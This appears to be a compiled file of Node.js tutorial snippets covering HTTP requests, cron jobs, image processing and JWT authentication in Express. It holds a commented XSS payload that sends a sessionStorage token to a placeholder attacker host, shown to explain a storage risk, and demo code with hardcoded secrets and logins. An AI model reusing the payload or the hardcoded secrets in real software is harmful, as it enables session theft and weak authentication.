/*
    Base64 Encoding and Decoding
    https://usefulangle.com/post/303/nodejs-base64-encode-decode

    Node.js does not support the standard Javascript methods of atob() and btoa() for base64 conversions.
    Base64 encoding and decoding can be done in Node.js using the Buffer module.
*/

// Encoding to Base64 in Node.js
// =====================================================================
// UTF8 input string
let str = "UsefulAngle";

// create buffer from string
let binaryData = Buffer.from(str, "utf8");

// decode buffer as base64
let base64Data = binaryData.toString("base64");

// "VXNlZnVsQW5nbGU="
console.log(base64Data);


// Decoding  to Base64 in Node.js
// =====================================================================
// base64 encoded input string
let str = "VXNlZnVsQW5nbGU=";

// create buffer from base64 string
let binaryData = Buffer.from(str, "base64");

// decode buffer as utf8
let base64Dec = binaryData.toString("utf8");

// "UsefulAngle"
console.log(base64Dec);


/*
    Get Date and Time for a Given Timezone
*/
// Date object initialized as per New Zealand timezone. Returns a datetime string
let nz_date_string = new Date().toLocaleString("en-US", { timeZone: "Pacific/Chatham" });

// Date object initialized from the above datetime string
let date_nz = new Date(nz_date_string);

// year as (YYYY) format
let year = date_nz.getFullYear();

// month as (MM) format
let month = ("0" + (date_nz.getMonth() + 1)).slice(-2);

// date as (DD) format
let date = ("0" + date_nz.getDate()).slice(-2);

// hours as (HH) format
let hours = ("0" + date_nz.getHours()).slice(-2);

// minutes as (mm) format
let minutes = ("0" + date_nz.getMinutes()).slice(-2);

// seconds as (ss) format
let seconds = ("0" + date_nz.getSeconds()).slice(-2);

// date as YYYY-MM-DD format
let date_yyyy_mm_dd = year + "-" + month + "-" + date;
console.log("Date in YYYY-MM-DD format: " + date_yyyy_mm_dd);

// time as hh:mm:ss format
let time_hh_mm_ss = hours + ":" + minutes + ":" + seconds;
console.log("Time in hh:mm:ss format: " + time_hh_mm_ss);

// date and time as YYYY-MM-DD hh:mm:ss format
let date_time = year + "-" + month + "-" + date + " " + hours + ":" + minutes + ":" + seconds;
console.log("Date and Time in YYYY-MM-DD hh:mm:ss format: " + date_time);

// Javascript timestamps are specified in milliseconds
let ts = 1581338765000;

let nz_date_string = new Date(ts).toLocaleString("en-US", { timeZone: "Pacific/Chatham" });

// rest of the code


/*
    Creating and Starting a Web Server
    - Starting a HTTP Server
    - Starting a HTTPS Server
*/

// Starting a HTTP Server
// =====================================================================
const http = require('http');

// creates the server
const server = http.createServer((request, response) => {
    // handle incoming HTTP requests
});

// handle error while creating or starting server
server.on('error', (error) => {
    console.log(error);
});

// handle error when some client connection failed
server.on('clientError', (error, socket) => {
    // proper HTTP format message
    socket.end('HTTP/1.1 400 Bad Request');
});

// start listening for HTTP requests on port 8080
server.listen(8080);


// Starting a HTTPS Server
// =====================================================================
const https = require('https');
const fs = require('fs');

// read the crt and key file from the server path
const options = {
    key: fs.readFileSync('/ssl/server.key'),
    cert: fs.readFileSync('/ssl/server.crt')
};

// creates the server
const server = https.createServer(options, (request, response) => {
    // handle incoming HTTPS requests
});

// handle error while creating or starting server
server.on('error', (error) => {
    console.log(error);
});

// handle error when some client connection failed
server.on('clientError', (error, socket) => {
    socket.end('HTTP/1.1 400 Bad Request');
});

// start listening for HTTPS requests on port 8080
server.listen(8080);

/*
    Making Synchronous HTTP Requests
*/

// Using Javascript Promises to Make HTTP Request
// =====================================================================
// will be executed asynchronously
http.get('http://www.usefulangle.com/api?api_key=554545', (response) => {
    let chunks_of_data = [];

    response.on('data', (fragments) => {
        chunks_of_data.push(fragments);
    });

    response.on('end', () => {
        let response_body = Buffer.concat(chunks_of_data);

        // response body
        console.log(response_body.toString());
    });

    response.on('error', (error) => {
        console.log(error);
    });
});


// a bit synchronous syntax, using Javascript Promises
// define the promise
let request_call = new Promise((resolve, reject) => {
    http.get('http://www.usefulangle.com/api?api_key=554545', (response) => {
        let chunks_of_data = [];

        response.on('data', (fragments) => {
            chunks_of_data.push(fragments);
        });

        response.on('end', () => {
            let response_body = Buffer.concat(chunks_of_data);

            // promise resolved on success
            resolve(response_body.toString());
        });

        response.on('error', (error) => {
            // promise rejected on error
            reject(error);
        });
    });
});

// promise resolved or rejected asynchronously
request_call.then((response) => {
    console.log(response);
}).catch((error) => {
    console.log(error);
});



// Making Javascript to Wait using async and await
// - The await operator can be placed before a Promise and makes Javascript to
//   wait till the time promise is resolved or rejected. await can only be used
//   inside an async function.
// - Inside the async function the Promise will be "awaited" to get either
//   resolved or rejected. Until this happens, code execution inside the async
//   function will not move forward.
//   =====================================================================
// async function to make http request
async function makeSynchronousRequest() {
    try {
        // http_promise is a Promise
        // "response_body" will hold the response if the Promise is resolved
        let response_body = await http_promise;
    }
    catch (e) {
        // if the Promise is rejected
        console.error(e);
    }
}

// anonymous async function to execute some code synchronously after http request
(async function () {
    // wait to http request to finish
    await makeSynchronousRequest();

    // below code will be executed after http request is finished
    // some code
})();


// Complete code allows make synchronous-style HTTP requests from Node.
// =====================================================================
const http = require('http');

// function returns a Promise
function getPromise() {
    return new Promise((resolve, reject) => {
        http.get('http://www.usefulangle.com/api?api_key=554545', (response) => {
            let chunks_of_data = [];

            response.on('data', (fragments) => {
                chunks_of_data.push(fragments);
            });

            response.on('end', () => {
                let response_body = Buffer.concat(chunks_of_data);
                resolve(response_body.toString());
            });

            response.on('error', (error) => {
                reject(error);
            });
        });
    });
}

// async function to make http request
async function makeSynchronousRequest(request) {
    try {
        let http_promise = getPromise();
        let response_body = await http_promise;

        // holds response from server that is passed when Promise is resolved
        console.log(response_body);
    }
    catch (error) {
        // Promise rejected
        console.log(error);
    }
}

console.log(1);

// anonymous async function to execute some code synchronously after http request
(async function () {
    // wait to http request to finish
    await makeSynchronousRequest();

    // below code will be executed after http request is finished
    console.log(2);
})();

console.log(3);


/*
    Making GET Requests in Node.JS
    - initiating HTTP GET request through Node
    - can be used to implement third party API calls
    - Sending GET Request
    - Getting Response from Server
*/

// Sending GET Request
// =====================================================================
const http = require('http');
// const http = require('https');  // for https
const querystring = require('querystring');

// GET parameters
const parameters = {
    id: 123,
    type: "post"
}

// GET parameters as query string : "?id=123&type=post"
const get_request_args = querystring.stringify(parameters);

// Final url is "http://usefulangle.com/get/ajax.php?id=123&type=post"
const options = {
    url: "http://www.usefulangle.com",
    port: "80",
    path: "/get/ajax.php?" + get_request_args,
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
}

// send request
const request = http.request(options, (response) => {
    // response from server
});

// In case error occurs while sending request
request.on('error', (error) => {
    console.log(error.message);
});

request.end();


// Getting Response from Server
// =====================================================================
// A callback is passed to the http.request method while handles the response
// received from the server.
const request = http.request(options, (response) => {
    // response from server

    // HTTP status code (200, 404 etc)
    console.log(response.statusCode);

    // response headers
    console.log(response.headers);
});

// The response data from the server comes in chunks. The response might be a
// single chunk for small response or a series on chunks for larger responses.
// To get the body of the response, these chunks are collected and merged
// through events.

// The data event is emitted when a chunk arrives and the end event is emitted
// when all chunks have arrived.
const request = http.request(options, (response) => {
    // array to hold all chunks
    let all_chunks = [];

    // gather chunks
    response.on('data', (chunk) => {
        all_chunks.push(chunk);
    });

    // no more data to come
    // combine all chunks to a buffer
    response.on('end', () => {
        let response_body = Buffer.concat(all_chunks);

        // response body as string
        console.log(response_body.toString());

        // read the response body now
    });

    // handle error while getting response
    response.on('error', (error) => {
        console.log(error.message);
    });
});


// Complete Code
// =====================================================================
const http = require('http');
const querystring = require('querystring');

const parameters = {
    id: 123,
    type: "post"
}
const get_request_args = querystring.stringify(parameters);

const options = {
    url: "http://www.usefulangle.com",
    port: "80",
    path: "/get/ajax.php?" + get_request_args,
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
}

const request = http.request(options, (response) => {
    let all_chunks = [];

    response.on('data', (chunk) => {
        all_chunks.push(chunk);
    });

    response.on('end', () => {
        let response_body = Buffer.concat(all_chunks);
        console.log(response_body.toString());
    });

    response.on('error', (error) => {
        console.log(error.message);
    });
});

request.on('error', (error) => {
    console.log(error.message);
});

request.end();

/*
    Making POST Requests
    - Creating Payload for the POST Request
    - Sending POST Request
*/

// Creating Payload for the POST Request
// =====================================================================
// A POST request includes a payload data that is sent to the server as a query
// string (key-value pairs separated by a & character).

// A query string can be formed from the POST parameters using the inbuilt
// querystring module.
const querystring = require('querystring');

const parameters = {
    name: "UsefulAngle",
    type: "Website"
}

// parameters as query string
// ?name=UsefulAngle&type=Website
const post_data = querystring.stringify(parameters);


// Sending POST Request
// =====================================================================
// A POST request can be sent using the request method of the imported http
// object. This method accepts an object parameter in which you can set the
// options for the POST request.
const http = require('http');
const querystring = require('querystring');

// POST parameters
const parameters = {
    name: "UsefulAngle",
    type: "Website"
}


// POST parameters as query string
const post_data = querystring.stringify(parameters);

const options = {
    url: "http://www.usefulangle.com",
    port: "80",
    path: "/post/ajax.php",
    method: "POST"
}

const request = http.request(options, (response) => {
    // response from server
});

request.write(post_data);
request.end();


// Setting Request HTTP Headers
// =====================================================================
// The request headers can be set by creating a headers object in the options
// for the POST request. The request header data goes in key-value pairs.
const options = {
    url: "http://www.usefulangle.com",
    port: "80",
    path: "/post/ajax.php",
    method: "POST",
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
};


// Handling Errors while Sending Request
// =====================================================================
// An error event is emitted when an error is encountered while sending the
// request. To handle the error a listener is attached to the event. This
// listener accepts an object of Error class as a parameter.
request.on('error', (error) => {
    console.log('Error Code: ' + error.code);
    console.log('Error Message: ' + error.message);
});


// Getting Response from Server
// =====================================================================
// Response from the sever is gathered through a callback passed in the
// http.request method.
const request = http.request(options, (response) => {
    // response from server
});

// Node accepts the response from the server as a stream — response data comes
// in as a series of incoming chunks. If the response from server is small,
// there may be only a single chunk returned. If the response is huge, numerous
// chunks keep on arriving.

// In code we must gather all these chunks and combine them into a single
// response data at the end. We gather these chunks through events.

// The response object emits a data event when a chunk arrives and a end event
// when all chunks have arrived.
const request = http.request(options, (response) => {
    // holds all chunks
    let chunks_of_data = [];

    // gather chunk
    response.on('data', (fragments) => {
        chunks_of_data.push(fragments);
    });

    // no more data to come
    // combine all chunks
    response.on('end', () => {
        let response_body = Buffer.concat(chunks_of_data);

        // response body as string
        console.log(response_body.toString());
    });
});


// Getting Response Headers
// =====================================================================
// The response headers can be obtained from the headers property of the
// response object. The response headers are in key-value pairs.
const request = http.request(options, (response) => {
    // response headers
    console.log(response.headers);
});


// Getting HTTP Response Code
// =====================================================================
// The response code (200, 404, 500 etc) is obtained from the statusCode
// property of the response object.
const request = http.request(options, (response) => {
    // HTTP status code
    console.log(response.statusCode);
});


// Handling Errors while Receiving Response
// =====================================================================
// The response objects emits an error event in case an error is thrown during
// the process of getting the response.
response.on('error', (error) => {
    console.log('Error Code: ' + error.code);
    console.log('Error Message: ' + error.message);
});


// Complete Code
// =====================================================================
const http = require('http');
const querystring = require('querystring');

const parameters = {
    name: "UsefulAngle",
    type: "Website"
}

const post_data = querystring.stringify(parameters);

const options = {
    url: "http://www.usefulangle.com",
    port: "80",
    path: "/post/ajax.php",
    method: "POST",
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
}

const request = http.request(options, (response) => {
    let chunks_of_data = [];

    response.on('data', (fragments) => {
        chunks_of_data.push(fragments);
    });

    response.on('end', () => {
        let response_body = Buffer.concat(chunks_of_data);
        console.log(response_body.toString());
    });

    response.on('error', (error) => {
        console.log(error);
    });
});

request.on('error', (error) => {
    console.log('Error Code: ' + error.code);
    console.log('Error Message: ' + error.message);
});

request.write(post_data);
request.end();


/*
    Running Cron Jobs in Node.js
    - Installing node-cron
    - Setting up a Cron Job
    - Setting the Time in a Cron Job
    - Starting a Cron job
    - Stopping or Pausing an Ongoing Cron Job
    - Destroying a Cron Job
*/

// Installing node-cron
// =====================================================================
// npm install node-cron --save
const cron = require('node-cron');

// Setting up a Cron Job
// =====================================================================
/*
The schedule method is used to setup a cron job. This accepts 3 parameters :

- Interval or the time at which the cron job is needed to run
- The callback function which contains the code to be executed
- The third parameter is optional and passed as an object. The third parameter
    + accepts 2 fields in an object form : scheduled : accepts a boolean value.
    If set to false then the cron won't start automatically.
    + timezone : accepts the timezone and will interpret the time set in the
    first parameter of schedule method accordingly
*/
// The below snippet will print the line in the terminal every day when the time
// at "Europe/London" timezone is 17:50 Hours :
const cron = require('node-cron');

// cron wont start automatically
var task = cron.schedule('50 17 * * *', () => {
    console.log('Printing this line every day at 1750 Hours London Time.');
}, {
    scheduled: false,
    timezone: "Europe/London"
});

// start method is called to start the above defined cron job
task.start();


// Setting the Time in a Cron Job
// =====================================================================

/*
┌──────────────── second (optional) (Valid range 0-59)
| ┌────────────── minute (Valid range: 0-59)
| | ┌──────────── hour (valid range: 0-23)
| | | ┌────────── day of the month (Valid range: 1-31)
| | | | ┌──────── month (Valid range: 1-12 or names of the months)
| | | | | ┌────── day of the week (valid range: 0-7 or names of the days: both 0 and 7 denotes Sunday)
| | | | | |
| | | | | |
* * * * * *
*/

// Permissible values for each field is shown above within brackets. An asterisk
// implies the expression of time for that field matches all values of the
// field.

// If a cron job needs to be executed every second :
cron.schedule('* * * * * *', () => {
    // code
});

// If a cron job needs to be executed at the start of every minute, the time can
// be set in 2 ways as shown :
cron.schedule('0 * * * * *', () => {
    // code
});

// Note there are 5 asterisks
cron.schedule('* * * * *', () => {
    // code
});

// Similarly to run a cron job every hour
cron.schedule('0 * * * *', () => {
    // code
});

// If a cron job has to run on th 15th of every month at 01:00 Hours
cron.schedule('* 01 15 * *', () => {
    // code
});

// schedules the task to be executed every minute between 5th and 15th minute each hour
cron.schedule('5-15 * * * *', () => {
    // code
});

// task will be executed at 45th and 50th minute of each hour
cron.schedule('45,50 * * * *', () => {
    // code
});

// To run the cron job every N minutes :
cron.schedule('*/N * * * *', () => {
    // code
});

// Starting a Cron job
// =====================================================================
// If the scheduled key in the third parameter of schedule method has been set
// to false, the cron won't start automatically. In such cases or in case the
// cron job has been stopped, the cron is started by calling the start method.
const cron = require('node-cron');

// cron wont start automatically
var task = cron.schedule('* * * * *', () => {
    console.log('This line will be printed only when the start method is called');
}, {
    scheduled: false
});

// starts the cron job
task.start();

// Stopping or Pausing an Ongoing Cron Job
// =====================================================================
// If the need arises to stop or pause an ongoing cron job, it is achieved by
// calling the stop method. The cron job can again be restarted by calling the
// start method.
const cron = require('node-cron');

var task = cron.schedule('* * * * *', () => {
    // code
});

// stops the cron job
task.stop();

// Destroying a Cron Job
// =====================================================================
// If a cron job has to be destroyed, the destroy method is called. This method
// stops and destroys a cron job. Even if the start method is called afterwards,
// the cron wont start unlike in stop method.
const cron = require('node-cron');

var task = cron.schedule('* * * * *', () => {
    //Some cron job is running
});

// stops and destroys the cron job
task.destroy();

// wont start the cron job as it has been destroyed
task.start();



/*
    Using the Reviver Function in JSON.parse
*/
JSON.parse(jsonString, function (key, value) {
    // all key-value pairs in the JSON object are passed here

    // return value for the key
    return value;
});

// This optional second parameter is the reviver function. The purpose of this
// function is to modify the result before returning. In simple terms this
// reviver function can be thought of as a filter function. All parsed values
// are passed through this reviver function in key-value pair before being
// returned.

// Important : If a key-value pair passing through this reviver method causes an
// error or the reviver method returns “undefined” for any pair, then that
// key-value pair is dropped from the final parsed JSON object.

// Example #1
var jsonString = '{"1": "A", "2": "B", "3": "D", "4": "C"}';
var parsedJson = JSON.parse(jsonString, function (key, value) {
    if (key === 3)
        return "C";

    if (key === 4)
        return "D";

    return value;
});

console.log(parsedJson);
// { 1: "A", 2: "B", 3: "C", 4: "D" }


// Example #2
var jsonString = '[{"team":"Ferrari","drivers":[{"name":"Vettel"},{"name":"Raikkonen"}]}]';
var parsedJson = JSON.parse(jsonString, function (key, value) {
    if (value === "Ferrari")
        return "Scuderia Ferrari";

    if (value === "Raikkonen")
        return "Leclerc";

    return value;
});

console.log(parsedJson);
// [{ "team": "Scuderia Ferrari", "drivers": [{"name": "Vettel"}, {"name": "Leclerc"}] }]


// Example #3
// =====================================================================
var jsonString = '{"one": 1, "two": 2, "three": {"four": 4, "five": {"six": 6}}}';
var parsedJson = JSON.parse(jsonString, function (key, value) {
    console.log(key);
    return value;
});


/*
    Reading JSON in Node.js
    - Reading from a JSON File
    - Reading JSON from a URL
*/

// Reading from a JSON File
// =====================================================================
const fs = require("fs");

// JSON file
let fileName = "data.json";

// the file is read synchronously in this example
// you can read it asynchronously also
let data = JSON.parse(fs.readFileSync(fileName));

// will output a Javascript object
console.log(data);

// Reading JSON from a URL
// =====================================================================
const http = require('http');

let req = http.get("http://site.com/data.json", function (res) {
    let data = '',
        json_data;

    res.on('data', function (stream) {
        data += stream;
    });
    res.on('end', function () {
        json_data = JSON.parse(data);

        // will output a Javascript object
        console.log(json_data);
    });
});

req.on('error', function (e) {
    console.log(e.message);
});


/*
    Crop Images in Node.js
    - Installing Sharp: npm install sharp --save
    - Using the extract Method
*/
const sharp = require('sharp');

// original image
let originalImage = 'originalImage.jpg';

// file name for cropped image
let outputImage = 'croppedImage.jpg';

sharp(originalImage).extract({ width: 1920, height: 1080, left: 60, top: 40 }).toFile(outputImage)
    .then(function (new_file_info) {
        console.log("Image cropped and saved");
    })
    .catch(function (err) {
        console.log("An error occured");
    });


/*
    Resizing Images in Node.js
    - Installing Sharp: npm install sharp --save
    - Resizing by Height
*/

// This module is used to resize large images of any common file-type to
// web-friendly images of any dimension. This module claims to be multiple times
// faster than ImageMagick and GraphicsMagick.
// Input Formats — JPEG, PNG, WebP, TIFF, GIF and SVG
// Output Formats — JPEG, PNG, WebP and TIFF

// Resizing by Height
// The width is automatically set according to the aspect ratio of the image.
// =====================================================================
const sharp = require('sharp');

let inputFile = "img.jpg";
let outputFile = "output.jpg";

sharp(inputFile).resize({ height: 780 }).toFile(outputFile)
    .then(function (newFileInfo) {
        // newFileInfo holds the output file properties
        console.log("Success")
    })
    .catch(function (err) {
        console.log("Error occured");
    });


// Resizing by Width
// Height is automatically set according to the aspect ratio.
// =====================================================================
const sharp = require('sharp');

let inputFile = "img.jpg";
let outputFile = "output.jpg";

sharp(inputFile).resize({ width: 1040 }).toFile(outputFile)
    .then(function (newFileInfo) {
        console.log("Success");
    })
    .catch(function (err) {
        console.log("Error occured");
    });

// Resizing by Height and Width
// the aspect ratio is not maintained.
// =====================================================================
const sharp = require('sharp');

let inputFile = "img.jpg";
let outputFile = "output.jpg";

sharp(inputFile).resize({ height: 1560, width: 1600 }).toFile(outputFile)
    .then(function (newFileInfo) {
        console.log("Success");
    })
    .catch(function (err) {
        console.log("Error occured");
    });


// Optimization using Streams
// =====================================================================
// In case of large sized images, you can open an readable stream to the image,
// pipe it to sharp, and then pipe the sharp output to a file. This will save
// memory.
const sharp = require('sharp');
const fs = require('fs');

// input stream
let inStream = fs.createReadStream('img.jpg');

// output stream
let outStream = fs.createWriteStream('output.jpg', { flags: "w" });

// on error of output file being saved
outStream.on('error', function () {
    console.log("Error");
});

// on success of output file being saved
outStream.on('close', function () {
    console.log("Successfully saved file");
});

// input stream transformer
// "info" event will be emitted on resize
let transform = sharp()
    .resize({ width: 711, height: 400 })
    .on('info', function (fileInfo) {
        console.log("Resizing done, file not saved");
    });

inStream.pipe(transform).pipe(outStream);


/*
    Node.js - Reading a File Line by Line
*/
const readline = require('readline');
const fs = require('fs');

// create instance of readline
// each instance is associated with single input stream
let rl = readline.createInterface({
    input: fs.createReadStream('products.txt')
});

let line_no = 0;

// event is emitted after each line
rl.on('line', function (line) {
    line_no++;
    console.log(line);
});

// end
rl.on('close', function (line) {
    console.log('Total lines : ' + line_no);
});


/*
    Works with Image Jimp in Nodejs
    - Installation jimp: npm install --save jimp
    @jimp/jpeg
    @jimp/png
    @jimp/gif
*/
// =====================================================================
Jimp.read('http://www.example.com/path/to/lenna.jpg')
    .then(image => {
        // Do stuff with the image.
    })
    .catch(err => {
        // Handle an exception.
    });

// Resizing
// resize( w, h[, mode] )
// =====================================================================
const Jimp = require('jimp');
async function resize() {
    // Read the image.
    const image = await Jimp.read('https://images.pexels.com/photos/298842/pexels-photo-298842.jpeg');
    // Resize the image to width 150 and heigth 150.
    await image.resize(150, 150);
    // Save and overwrite the image
    await image.writeAsync(`test/${Date.now()}_150x150.png`);
}
resize();

// Crop
// crop( x, y, w, h)
// =====================================================================
async function crop() {
    // Read the image.
    const image = await Jimp.read('https://images.pexels.com/photos/298842/pexels-photo-298842.jpeg');
    await image.crop(500, 500, 150, 150);
    // Save and overwrite the image
    await image.writeAsync(`test/${Date.now()}_crop_150x150.png`);
}
crop()

// Rotate
// rotate( deg[, mode] );
// =====================================================================
async function rotate() {
    // Read the image.
    const image = await Jimp.read('https://images.pexels.com/photos/298842/pexels-photo-298842.jpeg');
    await image.rotate(45);
    // Save and overwrite the image
    await image.writeAsync(`test/${Date.now()}_rotate_150x150.png`);
}
rotate()

// Flip
// image.flip( horz, vert )
// =====================================================================
async function flip() {
    // Read the image.
    const image = await Jimp.read('https://images.pexels.com/photos/298842/pexels-photo-298842.jpeg');
    await image.flip(true, false);
    // Save and overwrite the image
    await image.writeAsync(`test/${Date.now()}_flip_150x150.png`);
    console.log("flipped")
}
flip()

// Opacity
// opacity( f );
// =====================================================================
async function opacity() {
    // Read the image.
    const image = await Jimp.read('https://images.pexels.com/photos/298842/pexels-photo-298842.jpeg');
    await image.opacity(.5);
    // Save and overwrite the image
    await image.writeAsync(`test/${Date.now()}_opacity_150x150.png`);
}
opacity()

// Grayscale
// greyscale();
// =====================================================================
async function greyscale() {
    // Read the image.
    const image = await Jimp.read('https://images.pexels.com/photos/298842/pexels-photo-298842.jpeg');
    await image.greyscale();
    // Save and overwrite the image
    await image.writeAsync(`test/${Date.now()}_greyscale_150x150.png`);
}
greyscale()

// Blur
// blur(r) // fast blur the image by r pixels
// =====================================================================
async function blur() {
    // Read the image.
    const image = await Jimp.read('https://images.pexels.com/photos/298842/pexels-photo-298842.jpeg');
    await image.blur(20);
    // Save and overwrite the image
    await image.writeAsync(`test/${Date.now()}_blur_150x150.png`);
}
blur()

// Add text to images
// composite( src, x, y, [{ mode, opacitySource, opacityDest }] ); 
// =====================================================================
async function waterMark(waterMarkImage) {
    let watermark = await Jimp.read(waterMarkImage);
    watermark = watermark.resize(300, 300);
    const image = await Jimp.read('https://images.pexels.com/photos/298842/pexels-photo-298842.jpeg');
    watermark = await watermark
    image.composite(watermark, 0, 0, {
        mode: Jimp.BLEND_SOURCE_OVER,
        opacityDest: 1,
        opacitySource: 0.5
    })
    await image.writeAsync(`test/${Date.now()}_waterMark_150x150.png`);
}
waterMark('https://destatic.blob.core.windows.net/images/nodejs-logo.png');

// Text overlay
// =====================================================================
async function textOverlay() {
    const font = await Jimp.loadFont(Jimp.FONT_SANS_32_BLACK);
    const image = await Jimp.read(1000, 1000, 0x0000ffff);

    image.print(font, 10, 10, 'Hello World!');
}

textOverlay();



// Async await Error Handling in Express (more routes)
// =====================================================================
// Util.js
module.exports = fn => (req, res, next) => {
    Promise.resolve(fn(req, res, next))
        .catch(next);
};

// Controller.js
const getUser = async (req, res, next) => {
    const { id } = req.params;
    const user = await User.findById(id); // f.ex. mongoose findById method
};

// Routes.js
const asyncMiddleware = require('Util');
router.get("/user/:id", asyncMiddleware(getUser));


// JSON Web Token (JWT): refresh token
// =====================================================================
// 1. Install Express Generate: https://expressjs.com/en/starter/generator.html
// npx express-generator
// express --view=ejs refreshToken-demo
// cd refreshToken-demo
// npm install
// set DEBUG=refreshToken-demo:* & npm start

//  app.js: Creating Server and adding routes
var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
var app = express();
//add them
var bodyParser = require('body-parser')

app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: true }))

var indexRouter = require('./routes/index');
var usersRouter = require('./routes/users');



// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.use('/', indexRouter);
app.use('/users', usersRouter);

// catch 404 and forward to error handler
app.use(function (req, res, next) {
    next(createError(404));
});

// error handler
app.use(function (err, req, res, next) {
    // set locals, only providing error in development
    res.locals.message = err.message;
    res.locals.error = req.app.get('env') === 'development' ? err : {};

    // render the error page
    res.status(err.status || 500);
    res.render('error');
});

module.exports = app;

/*
    usersRouter: is the place where Users data is stored. Therefore, only
    authorized and successful login users can obtain this data through the
    token-based API.
    indexRouter: is where the router will declare API login and API to
    retrieve token if token expires must use refreshToken.
*/

// Create files
// ### /router/index.js
var express = require('express');
var router = express.Router();
const _CONF = require('../config')
var jwt = require('jsonwebtoken')

var refreshTokens = {};// tao mot object chua nhung refreshTokens


/* GET home page. */
router.get('/', function (req, res, next) {
    return res.json({ status: 'success', elements: 'Hello anonystick' })
});

/* LOGIN . */
router.post('/login', function (req, res, next) {
    const { username, password } = req.body;
    if (username === 'anonystick.com' && password === 'anonystick.com') {
        let user = {
            username: username,
            role: 'admin'
        }
        // token should saved on client Cookie (not sessionStorage)
        const token = jwt.sign(user, _CONF.SECRET, { expiresIn: _CONF.tokenLife });//20 giay
        const refreshToken = jwt.sign(user, _CONF.SECRET_REFRESH, { expiresIn: _CONF.refreshTokenLife })

        const response = {
            "status": "Logged in",
            "token": token,
            "refreshToken": refreshToken,
        }

        refreshTokens[refreshToken] = response

        return res.json(response)
    }
    return res.json({ status: 'success', elements: 'Login failed!!!' })

})

/* Get new token when jwt expired . */

router.post('/token', (req, res) => {
    // refresh the damn token
    const { refreshToken } = req.body
    // if refresh token exists
    if (refreshToken && (refreshToken in refreshTokens)) {
        const user = {
            username: 'anonystick.com',
            role: 'admin'
        }
        const token = jwt.sign(user, _CONF.SECRET, { expiresIn: _CONF.tokenLife })
        const response = {
            "token": token,
        }
        // update the token in the list
        refreshTokens[refreshToken].token = token
        res.status(200).json(response);
    } else {
        res.status(404).send('Invalid request')
    }
})

module.exports = router;

// ### /routes/users.js
var express = require('express');
var router = express.Router();


router.use(require('../middleware/checkToken'))
/* GET users listing. */
router.get('/', function (req, res) {
    const users = [{
        username: 'Cr7',
        team: 'Juve',
    }, {
        username: 'Messi',
        team: 'Barca',
    }]
    res.json({ status: 'success', elements: users })
})

module.exports = router;


// ### config/index.js
const config = Object.freeze({
    SECRET: "SECRET_ANONYSTICK",
    SECRET_REFRESH: "SECRET_REFRESH_ANONYSTICK",
    tokenLife: 10,
    refreshTokenLife: 120
})

module.exports = config;


// ### middleware/checkToken.js
const jwt = require('jsonwebtoken')
const _CONF = require('../config/')

module.exports = (req, res, next) => {
    const token = req.body.token || req.query.token || req.headers['x-access-token']
    // decode token
    if (token) {
        // verifies secret and checks exp
        jwt.verify(token, _CONF.SECRET, function (err, decoded) {
            if (err) {
                console.error(err.toString());
                //if (err) throw new Error(err)
                return res.status(401).json({ "error": true, "message": 'Unauthorized access.', err });
            }
            console.log(`decoded>>${decoded}`);
            req.decoded = decoded;
            next();
        });
    } else {
        // if there is no token
        // return an error
        return res.status(403).send({
            "error": true,
            "message": 'No token provided.'
        });
    }
};

// Protect JWT
// =====================================================================
// Set-Cookie: session=15d38683-a98f-402d-a373-4f81a5549536; path=/; expires=xxxxxxx; httponly
// Set httpOnly => cant read by document.cookie
// Set Secure
// Set Cors


// SessionStorage JWT token | NOT USE
// =====================================================================
// When does the session storage take? When Close tab.
// Set a token to use Session Storage
authenticate(login, password)
    .then(function (authentication) {
        // set token
        window.sessionStorage.setItem('token', authentication.token);
    })
    .then(getAccounts)
    .then(function (accounts) {
        // display the accounts page
        // ...
    })
    .catch(function (error) {
        // display error message in the login form
        // ...
    });

// Get token and verify
/**
 * @return {Promise}
 */
function getAccounts() {
    return fetch('https://api.anonystickbank.com/accounts', {
        headers: {
            'Authorization': 'Token ' + window.sessionStorage.getItem('token'),
            'Content-Type': 'application/json; charset=utf-8',
            'Accept': 'application/json',
        }
    }).then(function (response) {
        return response.json();
    })
}

// XSS in comment admin
// <script>
//     var token = window.sessionStorage.getItem('token');
//     var a=document.createElement("a");
//     a.innerHTML = 'See my profile xxx';
//     a.href = 'http://domain.hackers/myprofile?token=' + token;
//     document.body.appendChild(a);
// </script>


// JSON Web Token: RESTful API security with JWT and HttpOnly Cookies, Secure.
// Back-End: https://github.com/anonystick/demo-jwt-token
// Client: https://github.com/anonystick/demo-jwt-token-client

// 1 - Create users.json
// users data when access to http://localhost:3000/api/users

// [
//     {
//         "id": 1,
//         "name": "anonystick"
//     },
//     {
//         "id": 2,
//         "name": "anonymous hackers"
//     }
// ]

// 2 - package.json
// npm i

// {
// "name": "demo-auth-jwt",
// "version": "1.0.0",
// "description": "",
// "main": "index.js",
// "scripts": {
//   "start": "nodemon index.js",
//   "test": "echo \"Error: no test specified\" && exit 1"
// },
// "keywords": [],
// "author": "",
// "license": "ISC",
// "devDependencies": {
//   "nodemon": "^1.19.1"
// },
// "dependencies": {
//   "cookie-parser": "^1.4.4",
//   "cors": "^2.8.5",
//   "express": "^4.17.1",
//   "jsonwebtoken": "^8.5.1"
// }
// }

// 3 - index.js : simple restful api
// role of app.post('/auth/login') is when the user confirms the pass and
// email if successful, it will return to the user a token, and server will set
// a Cookie in the client's browser.And this cookie in User will never be read
// by JavaScript.It will be browser automatically sent when required.

// When the User Login confirms
app.post('/auth/login', (req, res) => {
    try {
        const email = req.body.email;
        const password = req.body.password;
        if (email !== 'anonystick@gmail.com' || password !== 'password') {
            res.status(400);
            throw new Error('invalid info');
        };
        const payload = {
            email: email
        };
        const token = jwt.sign(payload, SECRET);
        res.cookie('access_token', token, {
            maxAge: 365 * 24 * 60 * 60 * 100, // Life time
            httpOnly: true, // Only HTTP read token, javascript can't read
            //secure: true; // SSL If yes, if you run localhost, please comment it
        });
        res.status(200).json({ ok: true });
    } catch (err) {
        throw err;
    };
});

// create a service to allow user request to get user list
app.use('/api/users', (req, res) => {
